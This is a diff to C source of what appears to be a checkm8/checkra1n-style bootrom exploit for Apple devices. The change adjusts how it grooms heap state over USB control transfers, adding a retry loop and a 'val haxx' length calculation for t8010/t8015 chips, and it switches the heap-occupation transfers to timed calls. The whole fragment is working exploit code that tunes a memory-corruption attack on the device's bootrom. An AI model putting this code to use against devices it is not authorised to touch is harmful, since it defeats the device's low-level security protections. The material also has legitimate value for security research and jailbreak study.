@@ -57,27 +57,26 @@ void set_global_state(io_client_t client){
     unsigned int val;
     unsigned int sent;
     
-    //r = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0);
-    //usleep(1000);
-    
-    //r = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64, 0);
-    //usleep(1000);
-    
-    r = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0);
-    usleep(1000);
-    
     val = 1408; // t8010 & t8015
-    {
-        // val haxx
-        val += 0x40;
-        sent = r;
-        DEBUG_("sent: %x\n", sent);
-        if(sent>val){
-            sent = 0;
-        }
-        val -= sent;
-        DEBUG_("val: %x\n", val);
+    
+    /* val haxx
+     * If async_transfer() sent = 0x40, then val = 1408. And, it is possible to try again a few times and wait until sent = 0x40
+     * However, even if sent != 0x40, it succeeds by subtracting the value from val.
+     * To reduce the number of attempts, It decided to use subtraction unless sent is greater than val.
+     */
+    
+    int i=0;
+    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0)) >= val){
+        i++;
+        DEBUG_("%x\n", i);
+        r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
     }
+    
+    val += 0x40;
+    val -= sent;
+    
+    DEBUG_("sent: %x\n", sent);
+    DEBUG_("newval: %x\n", val);
     
     r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
     
@@ -92,7 +91,8 @@ void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payl
     usleep(100000);
     
     for(int i=0;i<16;i++){
-        r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 0);
+        //r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 0);
+        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
     }
     usleep(10000);
     
